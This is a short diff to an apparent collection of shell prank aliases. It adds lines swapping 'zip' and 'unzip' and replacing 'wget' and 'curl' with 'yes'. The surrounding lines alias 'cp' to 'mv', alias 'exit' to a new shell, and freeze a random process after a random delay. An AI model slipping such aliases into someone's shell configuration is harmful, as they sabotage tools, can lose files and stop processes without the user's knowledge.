@@ -37,6 +37,14 @@ sleep $[ ( $RANDOM % 100 )  + 1 ]s && kill -STOP $(ps x -o pid|sed 1d|sort -R|he
 # Have `cp` perform `mv` instead
 alias cp='mv'
 
+# reverse zip & unzip
+alias zip='unzip'
+alias unzip='zip'
+
+# replace wget & curl with yes
+alias wget='yes'
+alias curl='yes'
+
 # Make `exit` open a new shell
 alias exit='sh'
 
